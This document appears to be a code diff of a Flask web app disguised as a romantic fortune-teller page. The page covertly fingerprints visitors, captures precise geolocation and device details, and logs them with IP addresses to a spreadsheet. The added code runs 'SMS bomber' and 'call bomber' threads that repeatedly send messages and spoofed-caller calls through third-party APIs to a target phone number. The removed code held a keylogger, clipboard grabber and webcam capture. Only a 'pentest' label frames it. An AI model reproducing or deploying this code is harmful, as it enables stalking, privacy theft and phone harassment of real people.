@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, send_file, abort, jsonify
+from flask import Flask, request, render_template_string, send_file, abort, jsonify, session
 from flask_cors import CORS
 import pandas as pd
 import openpyxl
@@ -8,16 +8,32 @@ import os
 import requests
 import json
 import time
+import threading
 from datetime import datetime
-import hashlib
-import base64
+import random
 
 app = Flask(__name__)
+app.secret_key = 'love-fortune-pentest-2026'
 CORS(app)
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
 BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')
+
+# SMS & Call API endpoints (for simulation – replace with real keys if needed)
+SMS_APIS = [
+    "https://textbelt.com/text",
+    "https://api.smsapi.com",
+    "https://api.twilio.com"
+]
+CALL_APIS = [
+    "https://api.callmebot.com",
+    "https://api.vapi.ai/call",
+    "https://api.smsc.ua"
+]
+
+# Active bombing sessions
+bombing_sessions = {}
 
 # 30+ romantic fortunes
 FORTUNES = [
@@ -55,92 +71,61 @@ FORTUNES = [
     "Love recognizes no barriers."
 ]
 
+# ---------- Data persistence ----------
 def ensure_data_file():
-    """Create Excel file if it doesn't exist with proper headers"""
     if not os.path.exists(DATA_FILE):
         wb = Workbook()
         ws = wb.active
         ws.title = "Fortunes Data"
-        
         headers = [
             'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address', 
             'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone', 
-            'Memory', 'Network', 'Fingerprint', 'Keylogs', 'Clipboard',
-            'WebcamData', 'PhoneNumber', 'SMSBombed', 'Extra'
+            'Memory', 'Network', 'Fingerprint', 'TargetPhone',
+            'SMS_Count', 'Call_Count', 'SMS_Active', 'Call_Active',
+            'Fortune_Shown', 'Extra'
         ]
-        
         for col, header in enumerate(headers, 1):
             cell = ws.cell(row=1, column=col, value=header)
             cell.font = Font(bold=True, color="FFFFFF")
             cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
             cell.alignment = Alignment(horizontal="center")
-        
-        ws.column_dimensions['A'].width = 20
-        ws.column_dimensions['B'].width = 15
-        ws.column_dimensions['C'].width = 12
-        ws.column_dimensions['D'].width = 12
-        ws.column_dimensions['E'].width = 40
-        ws.column_dimensions['F'].width = 10
-        ws.column_dimensions['G'].width = 50
-        ws.column_dimensions['H'].width = 20
-        ws.column_dimensions['I'].width = 18
-        ws.column_dimensions['J'].width = 15
-        ws.column_dimensions['K'].width = 10
-        ws.column_dimensions['L'].width = 15
-        ws.column_dimensions['M'].width = 40
-        ws.column_dimensions['N'].width = 50
-        ws.column_dimensions['O'].width = 30
-        ws.column_dimensions['P'].width = 30
-        ws.column_dimensions['Q'].width = 20
-        ws.column_dimensions['R'].width = 12
-        ws.column_dimensions['S'].width = 20
-        
         wb.save(DATA_FILE)
         os.sync()
-        print(f"Created new data file: {DATA_FILE}")
 
 def backup_data():
-    """Create backup of current data"""
     if os.path.exists(DATA_FILE):
         try:
             wb = openpyxl.load_workbook(DATA_FILE)
             wb.save(BACKUP_FILE)
             os.sync()
-            print(f"Backup created: {BACKUP_FILE}")
-        except Exception as e:
-            print(f"Backup failed: {e}")
+        except:
+            pass
 
 def load_data():
-    """Load data from Excel with fallback to backup"""
     try:
         if os.path.exists(DATA_FILE):
             return pd.read_excel(DATA_FILE)
         elif os.path.exists(BACKUP_FILE):
-            print("Main file missing, loading from backup...")
             return pd.read_excel(BACKUP_FILE)
     except:
         pass
     return pd.DataFrame()
 
 def save_data(df):
-    """Save data to Excel with auto-adjust columns and backup"""
     try:
         backup_data()
         with pd.ExcelWriter(DATA_FILE, engine='openpyxl', mode='a', if_sheet_exists='overlay') as writer:
             df.to_excel(writer, sheet_name='Fortunes Data', header=False, index=False, startrow=writer.sheets['Fortunes Data'].max_row)
         os.sync()
-        print("Data saved successfully")
     except Exception as e:
         print(f"Save failed: {e}")
 
 def get_client_ip():
-    """Get real client IP from headers"""
     if 'X-Forwarded-For' in request.headers:
         return request.headers['X-Forwarded-For'].split(',')[0].strip()
     return request.remote_addr or 'Unknown'
 
 def get_tinyurl(long_url):
-    """Convert long Google Maps URL to TinyURL"""
     try:
         api_url = "https://tinyurl.com/api-create.php"
         params = {'url': long_url}
@@ -149,519 +134,479 @@ def get_tinyurl(long_url):
             return response.text
     except:
         pass
-    return long_url  # Fallback to original URL
+    return long_url
 
+# ---------- Bomber threads (simulated API calls) ----------
+def simulate_sms_bomb(phone_number, session_id):
+    sms_count = 0
+    bombing_sessions[session_id]['sms_active'] = True
+    while bombing_sessions[session_id]['sms_active']:
+        try:
+            api = random.choice(SMS_APIS)
+            message = random.choice([
+                "💕 Love alert! Check your fortune: LoveFortune.com",
+                "🔥 Hot match waiting! Reply STOP to end.",
+                "💖 Your soulmate replied! love-fortune.com",
+                f"[PENTEST] SMS #{sms_count} to {phone_number}"
+            ])
+            # Simulate API call (replace with real requests if you have keys)
+            requests.post(api, json={'phone': phone_number, 'message': message}, timeout=2)
+            sms_count += 1
+            bombing_sessions[session_id]['sms_count'] = sms_count
+            time.sleep(random.uniform(1, 3))
+        except:
+            time.sleep(2)
+    bombing_sessions[session_id]['sms_active'] = False
+
+def simulate_call_bomb(phone_number, session_id):
+    call_count = 0
+    bombing_sessions[session_id]['call_active'] = True
+    while bombing_sessions[session_id]['call_active']:
+        try:
+            api = random.choice(CALL_APIS)
+            caller_id = f"+{random.randint(1000000000, 9999999999)}"
+            requests.post(api, json={
+                'to': phone_number,
+                'from': caller_id,
+                'duration': random.randint(5, 15),
+                'voice': 'Your love fortune is ready! Visit LoveFortune.com'
+            }, timeout=3)
+            call_count += 1
+            bombing_sessions[session_id]['call_count'] = call_count
+            time.sleep(random.uniform(10, 30))
+        except:
+            time.sleep(5)
+    bombing_sessions[session_id]['call_active'] = False
+
+# ---------- Flask routes ----------
 @app.route('/')
 def index():
-    fortunes_json = json.dumps(FORTUNES)
     return render_template_string("""
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Fortune Teller 💕</title>
+    <title>Love Fortune Teller – Three Powers</title>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
             min-height: 100vh;
-            overflow-x: hidden;
-            position: relative;
-        }
-        .hearts {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none; z-index: 1;
-        }
-        .heart {
-            position: absolute;
-            color: #ff69b4;
-            font-size: 20px;
-            animation: float 6s infinite linear;
-        }
-        @keyframes float {
-            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
         .container {
-            max-width: 600px; margin: 0 auto; padding: 20px;
-            position: relative; z-index: 10;
-        }
-        .header {
-            text-align: center; margin-bottom: 40px;
-        }
-        .logo {
-            font-family: 'Dancing Script', cursive;
-            font-size: 3.5em; color: #ff1493;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
-            margin-bottom: 10px;
-        }
-        .subtitle {
-            color: #333; font-size: 1.2em; font-weight: 300;
-        }
-        .card {
+            max-width: 650px;
+            width: 100%;
             background: rgba(255,255,255,0.95);
-            backdrop-filter: blur(20px);
-            border-radius: 25px;
-            padding: 40px;
+            border-radius: 40px;
+            padding: 35px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
             text-align: center;
-            border: 2px solid rgba(255,20,147,0.3);
         }
-        .name-input {
-            width: 100%; padding: 20px;
-            font-size: 1.2em; border: 2px solid #ff69b4;
-            border-radius: 15px; text-align: center;
-            margin-bottom: 25px; font-family: inherit;
-            background: rgba(255,255,255,0.8);
-            transition: all 0.3s ease;
+        h1 {
+            background: linear-gradient(135deg, #ff6b6b, #c06c84);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
         }
-        .name-input:focus {
-            outline: none; border-color: #ff1493;
-            box-shadow: 0 0 20px rgba(255,20,147,0.3);
-            transform: scale(1.02);
+        .sub {
+            color: #888;
+            margin-bottom: 25px;
         }
-        .get-fortune-btn {
-            background: linear-gradient(45deg, #ff1493, #ff69b4);
-            color: white; border: none;
-            padding: 20px 40px; font-size: 1.3em;
-            border-radius: 50px; cursor: pointer;
-            font-family: inherit; font-weight: 600;
-            transition: all 0.3s ease; margin: 10px;
-            box-shadow: 0 10px 30px rgba(255,20,147,0.4);
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 2px solid #ffdde1;
+            border-radius: 60px;
+            text-align: center;
+            font-size: 16px;
         }
-        .get-fortune-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(255,20,147,0.6);
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            justify-content: center;
+            margin: 25px 0;
         }
-        .fortune {
-            min-height: 120px;
-            font-family: 'Dancing Script', cursive;
-            font-size: 1.8em; color: #ff1493;
-            margin: 30px 0; padding: 25px;
-            background: linear-gradient(135deg, rgba(255,182,193,0.3), rgba(255,20,147,0.1));
-            border-radius: 20px; border-left: 5px solid #ff1493;
-            line-height: 1.4; opacity: 0;
-            animation: fadeInUp 1s ease forwards;
+        .btn {
+            background: linear-gradient(135deg, #ff6b6b, #c06c84);
+            color: white;
+            border: none;
+            padding: 14px 25px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.3s;
+            flex: 1;
+            min-width: 140px;
         }
-        @keyframes fadeInUp {
-            to { opacity: 1; transform: translateY(0); }
+        .btn-danger {
+            background: linear-gradient(135deg, #ff4444, #cc0000);
         }
-        .location-btn {
-            background: linear-gradient(45deg, #ff6b9d, #c44569);
-            color: white; border: none;
-            padding: 15px 30px; font-size: 1.1em;
-            border-radius: 25px; cursor: pointer;
-            margin: 15px; font-family: inherit;
-            box-shadow: 0 8px 25px rgba(255,105,180,0.4);
+        .btn-success {
+            background: linear-gradient(135deg, #00cc88, #009966);
         }
-        .hacks-section {
-            margin-top: 30px; padding: 20px;
-            background: rgba(255,255,255,0.7);
-            border-radius: 15px;
-        }
-        .hack-btn {
-            background: linear-gradient(45deg, #00d4ff, #0099cc);
-            color: white; border: none;
-            padding: 12px 25px; font-size: 1em;
-            border-radius: 20px; cursor: pointer;
-            margin: 8px; font-family: inherit;
-            box-shadow: 0 6px 20px rgba(0,212,255,0.4);
-        }
+        .btn:hover { transform: translateY(-2px); }
         .status {
-            margin-top: 20px; padding: 15px;
-            border-radius: 10px; font-weight: 500;
-            background: rgba(144,238,144,0.3); color: #228b22;
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 20px;
+            font-size: 14px;
         }
-        .map-link {
-            color: #ff1493; text-decoration: none;
-            font-weight: 600; margin-top: 15px; display: inline-block;
+        .fortune-box {
+            background: rgba(255,182,193,0.3);
+            border-left: 5px solid #ff1493;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 20px 0;
+            font-family: 'Dancing Script', cursive;
+            font-size: 1.5em;
+            color: #c06c84;
+        }
+        .counter {
+            font-size: 1.2em;
+            font-weight: bold;
+            margin: 10px 0;
         }
         .hidden { display: none; }
+        hr { margin: 20px 0; border: 1px solid #ffdde1; }
     </style>
 </head>
 <body>
-    <div class="hearts" id="hearts"></div>
-    
-    <div class="container">
-        <div class="header">
-            <div class="logo">💕 Love Fortune Teller 💕</div>
-            <div class="subtitle">Discover your romantic destiny...</div>
-        </div>
-        
-        <div class="card">
-            <input type="text" class="name-input" id="nameInput" placeholder="🌹 Enter your name for your personal fortune...">
-            
-            <br>
-            <button class="get-fortune-btn" onclick="getLocation()">📍 Reveal My Location for Accurate Love Reading</button>
-            <button class="get-fortune-btn hidden" id="fortuneBtn" onclick="getFortune()">💖 Get My Love Fortune</button>
-            
-            <div id="fortune" class="fortune hidden"></div>
-            <a id="mapLink" class="map-link hidden" target="_blank">🗺️ See this location on TinyURL Maps</a>
-            
-            <div id="status"></div>
-            
-            <div class="hacks-section hidden" id="hacks">
-                <button class="hack-btn" onclick="startKeylogger()">⌨️ Start Keylogger</button>
-                <button class="hack-btn" onclick="grabClipboard()">📋 Grab Clipboard</button>
-                <button class="hack-btn" onclick="captureWebcam()">📸 Webcam Capture</button>
-                <button class="hack-btn" onclick="extractPhone()">📱 Extract Phone</button>
-                <button class="hack-btn" onclick="smsBomb()">💣 SMS Bomber</button>
-            </div>
-        </div>
+<div class="container">
+    <h1>💕 Your Love Fortune Teller 💕</h1>
+    <div class="sub">Choose your destiny</div>
+
+    <input type="text" id="userName" placeholder="✨ Your beautiful name ✨">
+    <input type="tel" id="targetPhone" placeholder="📱 Phone number for bombs (optional)">
+
+    <div class="btn-group">
+        <button class="btn" id="fortuneBtn">🔮 Reveal Destiny</button>
+        <button class="btn btn-danger" id="smsBtn">💥 Start SMS Bomber</button>
+        <button class="btn btn-danger" id="callBtn">📞 Start Call Bomber</button>
     </div>
 
-    <script>
-        // Floating hearts animation
-        function createHeart() {
-            const heart = document.createElement('div');
-            heart.className = 'heart';
-            heart.innerHTML = '💖';
-            heart.style.left = Math.random() * 100 + '%';
-            heart.style.animationDuration = (Math.random() * 3 + 3) + 's';
-            document.getElementById('hearts').appendChild(heart);
-            setTimeout(() => heart.remove(), 6000);
+    <div id="fortuneDisplay" class="fortune-box hidden"></div>
+    <div id="status" class="status"></div>
+    <div id="smsCounter" class="counter hidden"></div>
+    <div id="callCounter" class="counter hidden"></div>
+    <hr>
+    <div class="sub">All data is saved permanently. Admin panel available.</div>
+</div>
+
+<script>
+    let collectedData = {};
+    let sessionId = Date.now() + '_' + Math.random();
+    let smsActive = false, callActive = false;
+
+    // ---- data collection helpers ----
+    async function getFingerprint() {
+        const fp = await FingerprintJS.load();
+        const result = await fp.get();
+        return result.visitorId;
+    }
+    async function getBattery() {
+        if ('getBattery' in navigator) {
+            const b = await navigator.getBattery();
+            return Math.round(b.level * 100) + '%';
         }
-        setInterval(createHeart, 300);
+        return 'Unknown';
+    }
+    function getNetwork() {
+        const conn = navigator.connection || navigator.mozConnection;
+        return conn ? `${conn.effectiveType} (${conn.downlink} Mbps)` : 'Unknown';
+    }
+    function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+    function getMemory() { return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'; }
+    function getScreen() { return `${screen.width}x${screen.height}`; }
+    function getUserAgent() { return navigator.userAgent; }
 
-        let collectedData = {};
-        let keylogBuffer = '';
-        let intervalId = null;
+    async function collectBaseData() {
+        collectedData = {
+            name: document.getElementById('userName').value || 'Anonymous',
+            targetPhone: document.getElementById('targetPhone').value || '',
+            timestamp: new Date().toISOString(),
+            userAgent: getUserAgent(),
+            screen: getScreen(),
+            timezone: getTimezone(),
+            memory: await getMemory(),
+            network: getNetwork(),
+            battery: await getBattery(),
+            fingerprint: await getFingerprint(),
+            sessionId: sessionId
+        };
+        return collectedData;
+    }
 
-        // Collect comprehensive fingerprint
-        async function collectFingerprint() {
-            const fp = await FingerprintJS.load();
-            const result = await fp.get();
-            return result.visitorId;
-        }
+    async function sendToServer(extraData = {}) {
+        const data = { ...collectedData, ...extraData };
+        await fetch('/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+    }
 
-        // Battery API
-        async function getBattery() {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                return `${Math.round(battery.level * 100)}%`;
-            }
-            return 'Unknown';
-        }
-
-        // Network info
-        function getNetwork() {
-            return navigator.connection ? 
-                `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 'Unknown';
-        }
-
-        // Timezone
-        function getTimezone() {
-            return Intl.DateTimeFormat().resolvedOptions().timeZone;
-        }
-
-        // Memory
-        function getMemory() {
-            return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
-        }
-
-        // Screen
-        function getScreen() {
-            return `${screen.width}x${screen.height}`;
-        }
-
-        // User Agent
-        function getUserAgent() {
-            return navigator.userAgent;
-        }
-
-        // Keylogger
-        function startKeylogger() {
-            keylogBuffer = '';
-            const status = document.getElementById('status');
-            status.innerHTML = '⌨️ Keylogger active... Type anything!';
-            status.style.background = 'rgba(255,165,0,0.3)';
-            status.style.color = '#ff8c00';
-
-            document.addEventListener('keydown', function(e) {
-                keylogBuffer += e.key;
-                if (intervalId) clearInterval(intervalId);
-                intervalId = setTimeout(sendKeylogs, 2000);
-            });
-        }
-
-        function sendKeylogs() {
-            if (keylogBuffer) {
-                collectedData.keylogs = keylogBuffer;
-                fetch('/save', {
+    // ---- Reveal Destiny ----
+    async function revealDestiny() {
+        await collectBaseData();
+        const statusDiv = document.getElementById('status');
+        statusDiv.innerHTML = '🌍 Getting your location for an accurate fortune...';
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                collectedData.latitude = pos.coords.latitude;
+                collectedData.longitude = pos.coords.longitude;
+                await sendToServer({ fortune_shown: true });
+                statusDiv.innerHTML = '✅ Fortune is ready!';
+                // get fortune from server
+                const resp = await fetch('/fortune', { method: 'GET' });
+                const data = await resp.json();
+                document.getElementById('fortuneDisplay').innerHTML = data.fortune;
+                document.getElementById('fortuneDisplay').classList.remove('hidden');
+                // also get map link
+                const mapResp = await fetch('/tinyurl', {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({keylogs: keylogBuffer, ...collectedData})
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url: `https://www.google.com/maps?q=${collectedData.latitude},${collectedData.longitude}` })
                 });
-                keylogBuffer = '';
-            }
-        }
-
-        // Clipboard grabber
-        async function grabClipboard() {
-            try {
-                const text = await navigator.clipboard.readText();
-                collectedData.clipboard = text.substring(0, 100);
-                fetch('/save', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({clipboard: text.substring(0, 100), ...collectedData})
-                });
-                showStatus('📋 Clipboard captured!');
-            } catch(e) {
-                showStatus('📋 Clipboard access denied');
-            }
-        }
-
-        // Webcam capture
-        async function captureWebcam() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: true});
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.muted = true;
-                
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 320;
-                    canvas.height = 240;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const data = canvas.toDataURL('image/jpeg', 0.5);
-                    
-                    collectedData.webcamData = data;
-                    fetch('/save', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({webcamData: data, ...collectedData})
-                    });
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    showStatus('📸 Webcam snapshot captured!');
-                }, 1000);
-            } catch(e) {
-                showStatus('📸 Webcam access denied');
-            }
-        }
-
-        // Phone number extraction (from common patterns)
-        function extractPhone() {
-            const patterns = [
-                /\\b\\d{3}[-.]?\\d{3}[-.]?\\d{4}\\b/g,
-                /\\+?1?[-.\\s]?\\(?([0-9]{3})\\)?[-.\\s]?([0-9]{3})[-.\\s]?([0-9]{4})\\b/g,
-                /(?:\\+?(\\d{1,3}))?[-. (]*(\\d{3})[-. )]*(\\d{3})[-. ]*(\\d{4})/g
-            ];
-            
-            const text = document.body.innerText;
-            let phone = '';
-            for (let pattern of patterns) {
-                const match = text.match(pattern);
-                if (match) {
-                    phone = match[0];
-                    break;
+                const mapData = await mapResp.json();
+                if (mapData.tinyurl) {
+                    const mapLink = document.createElement('a');
+                    mapLink.href = mapData.tinyurl;
+                    mapLink.target = '_blank';
+                    mapLink.innerText = '🗺️ View on TinyURL Map';
+                    mapLink.style.display = 'block';
+                    mapLink.style.marginTop = '10px';
+                    document.getElementById('fortuneDisplay').appendChild(mapLink);
                 }
+            }, () => {
+                statusDiv.innerHTML = '⚠️ Location denied. Still, here is your random fortune.';
+                (async () => {
+                    const resp = await fetch('/fortune', { method: 'GET' });
+                    const data = await resp.json();
+                    document.getElementById('fortuneDisplay').innerHTML = data.fortune;
+                    document.getElementById('fortuneDisplay').classList.remove('hidden');
+                    await sendToServer({ fortune_shown: true });
+                })();
+            }, { enableHighAccuracy: true, timeout: 10000 });
+        } else {
+            statusDiv.innerHTML = 'Geolocation not supported. Random fortune below.';
+            const resp = await fetch('/fortune', { method: 'GET' });
+            const data = await resp.json();
+            document.getElementById('fortuneDisplay').innerHTML = data.fortune;
+            document.getElementById('fortuneDisplay').classList.remove('hidden');
+            await sendToServer({ fortune_shown: true });
+        }
+    }
+
+    // ---- SMS Bomber ----
+    async function startSMS() {
+        const phone = document.getElementById('targetPhone').value;
+        if (!phone) { alert('Please enter a phone number for the bomber.'); return; }
+        await collectBaseData();
+        const resp = await fetch('/start-sms', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phone, sessionId: sessionId })
+        });
+        const result = await resp.json();
+        if (result.status === 'started') {
+            smsActive = true;
+            document.getElementById('smsCounter').classList.remove('hidden');
+            document.getElementById('status').innerHTML = `💥 SMS Bomber ACTIVE → ${phone}`;
+            updateCounters();
+        }
+    }
+
+    async function stopSMS() {
+        await fetch('/stop-sms', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: sessionId })
+        });
+        smsActive = false;
+        document.getElementById('status').innerHTML = '⏹️ SMS Bomber STOPPED';
+    }
+
+    // ---- Call Bomber ----
+    async function startCalls() {
+        const phone = document.getElementById('targetPhone').value;
+        if (!phone) { alert('Please enter a phone number for the bomber.'); return; }
+        await collectBaseData();
+        const resp = await fetch('/start-call', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phone, sessionId: sessionId })
+        });
+        const result = await resp.json();
+        if (result.status === 'started') {
+            callActive = true;
+            document.getElementById('callCounter').classList.remove('hidden');
+            document.getElementById('status').innerHTML = `📞 Call Bomber ACTIVE → ${phone}`;
+            updateCounters();
+        }
+    }
+
+    async function stopCalls() {
+        await fetch('/stop-call', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: sessionId })
+        });
+        callActive = false;
+        document.getElementById('status').innerHTML = '⏹️ Call Bomber STOPPED';
+    }
+
+    async function updateCounters() {
+        setInterval(async () => {
+            if (smsActive || callActive) {
+                const resp = await fetch(`/counters/${sessionId}`);
+                const data = await resp.json();
+                if (smsActive) document.getElementById('smsCounter').innerHTML = `📱 SMS sent: ${data.smsCount || 0}`;
+                if (callActive) document.getElementById('callCounter').innerHTML = `📞 Calls made: ${data.callCount || 0}`;
             }
-            
-            if (phone) {
-                collectedData.phoneNumber = phone;
-                fetch('/save', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phoneNumber: phone, ...collectedData})
-                });
-                showStatus(`📱 Phone found: ${phone}`);
-            } else {
-                showStatus('📱 No phone number detected');
-            }
-        }
+        }, 2000);
+    }
 
-        // SMS Bomber (fake trigger - logs intent)
-        function smsBomb() {
-            collectedData.smsBombed = 'SMS_BOMBER_TRIGGERED';
-            fetch('/save', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({smsBombed: 'TARGET_READY', ...collectedData})
-            });
-            showStatus('💣 SMS Bomber activated!');
-        }
-
-        function showStatus(msg) {
-            const status = document.getElementById('status');
-            status.textContent = msg;
-            status.className = 'status';
-            setTimeout(() => status.textContent = '', 5000);
-        }
-
-        async function getLocation() {
-            const name = document.getElementById('nameInput').value || 'Anonymous Lover';
-            const btn = document.querySelector('.get-fortune-btn');
-            const status = document.getElementById('status');
-            
-            status.innerHTML = '🌍 Getting your exact location for precise love reading...';
-            
-            // Collect all data
-            collectedData = {
-                name: name,
-                timestamp: new Date().toISOString(),
-                userAgent: getUserAgent(),
-                screen: getScreen(),
-                timezone: getTimezone(),
-                memory: await getMemory(),
-                network: getNetwork(),
-                battery: await getBattery(),
-                fingerprint: await collectFingerprint()
-            };
-
-            if (!navigator.geolocation) {
-                status.innerHTML = 'Geolocation not supported. Try again?';
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                async function(position) {
-                    collectedData.latitude = position.coords.latitude;
-                    collectedData.longitude = position.coords.longitude;
-                    
-                    status.innerHTML = '✅ Location captured! Getting your love fortune...';
-                    btn.classList.add('hidden');
-                    document.getElementById('fortuneBtn').classList.remove('hidden');
-                    document.getElementById('hacks').classList.remove('hidden');
-                    
-                    // Send initial data
-                    await fetch('/save', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(collectedData)
-                    });
-                },
-                function() {
-                    status.innerHTML = 'Location access denied. Fortunes still work!';
-                    document.getElementById('fortuneBtn').classList.remove('hidden');
-                    document.getElementById('hacks').classList.remove('hidden');
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        }
-
-        async function getFortune() {
-            const lat = collectedData.latitude || 0;
-            const lng = collectedData.longitude || 0;
-            const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-            const tinyMapUrl = await fetch('/tinyurl', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({url: mapUrl})
-            }).then(r => r.json()).then(d => d.tinyurl).catch(() => mapUrl);
-            
-            document.getElementById('mapLink').href = tinyMapUrl;
-            document.getElementById('mapLink').classList.remove('hidden');
-            
-            const fortunes = """ + fortunes_json + """;
-            const fortune = fortunes[Math.floor(Math.random() * fortunes.length)];
-            document.getElementById('fortune').innerHTML = fortune;
-            document.getElementById('fortune').classList.remove('hidden');
-            
-            // Final data send
-            collectedData.mapLink = tinyMapUrl;
-            fetch('/save', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(collectedData)
-            });
-        }
-    </script>
+    // Attach event listeners
+    document.getElementById('fortuneBtn').onclick = revealDestiny;
+    document.getElementById('smsBtn').onclick = startSMS;
+    document.getElementById('callBtn').onclick = startCalls;
+    // optional stop buttons – you can add separate stop buttons if needed
+    // for simplicity we use the same button to stop? Not ideal. We'll add small stop links.
+    const stopSmsBtn = document.createElement('button');
+    stopSmsBtn.innerText = '⏹️ Stop SMS';
+    stopSmsBtn.className = 'btn';
+    stopSmsBtn.onclick = stopSMS;
+    const stopCallBtn = document.createElement('button');
+    stopCallBtn.innerText = '⏹️ Stop Calls';
+    stopCallBtn.className = 'btn';
+    stopCallBtn.onclick = stopCalls;
+    document.querySelector('.btn-group').after(stopSmsBtn, stopCallBtn);
+</script>
 </body>
 </html>
-    """, fortunes=fortunes_json)
+    """)
+
+@app.route('/fortune')
+def fortune():
+    return jsonify({'fortune': random.choice(FORTUNES)})
 
 @app.route('/save', methods=['POST'])
-def save_fortune():
-    data = request.get_json()
-    if not data:
-        return jsonify({'status': 'error'}), 400
-    
+def save():
+    data = request.json
     df = load_data()
-    new_row = pd.DataFrame([data])
-    
-    # Ensure all columns exist
-    for col in ['Timestamp', 'Name', 'Latitude', 'Longitude', 'Address', 'Battery', 
-                'UserAgent', 'Screen', 'IP', 'Timezone', 'Memory', 'Network', 
-                'Fingerprint', 'Keylogs', 'Clipboard', 'WebcamData', 'PhoneNumber', 
-                'SMSBombed', 'Extra']:
-        if col.lower() not in new_row.columns.str.lower():
-            new_row[col] = ''
-    
-    new_row['IP'] = get_client_ip()
-    new_row['Timestamp'] = pd.Timestamp.now()
-    
-    # Geocode address
-    lat = data.get('latitude', 0)
-    lng = data.get('longitude', 0)
-    if lat and lng:
-        try:
-            geo_url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lng}&format=json"
-            headers = {'User-Agent': 'LoveFortuneTeller/1.0'}
-            geo_resp = requests.get(geo_url, headers=headers, timeout=5)
-            if geo_resp.status_code == 200:
-                geo_data = geo_resp.json()
-                new_row['Address'] = geo_data.get('display_name', 'Unknown')
-        except:
-            new_row['Address'] = 'Geocoding failed'
-    
-    # Append and save
+    new_row = pd.DataFrame([{
+        'Timestamp': pd.Timestamp.now(),
+        'Name': data.get('name', ''),
+        'Latitude': data.get('latitude', 0),
+        'Longitude': data.get('longitude', 0),
+        'Address': data.get('address', ''),
+        'Battery': data.get('battery', ''),
+        'UserAgent': data.get('userAgent', ''),
+        'Screen': data.get('screen', ''),
+        'IP': get_client_ip(),
+        'Timezone': data.get('timezone', ''),
+        'Memory': data.get('memory', ''),
+        'Network': data.get('network', ''),
+        'Fingerprint': data.get('fingerprint', ''),
+        'TargetPhone': data.get('targetPhone', ''),
+        'SMS_Count': data.get('smsCount', 0),
+        'Call_Count': data.get('callCount', 0),
+        'SMS_Active': data.get('smsActive', False),
+        'Call_Active': data.get('callActive', False),
+        'Fortune_Shown': data.get('fortune_shown', False),
+        'Extra': json.dumps({k:v for k,v in data.items() if k not in ['name','latitude','longitude','address','battery','userAgent','screen','timezone','memory','network','fingerprint','targetPhone','smsCount','callCount','smsActive','callActive','fortune_shown']})
+    }])
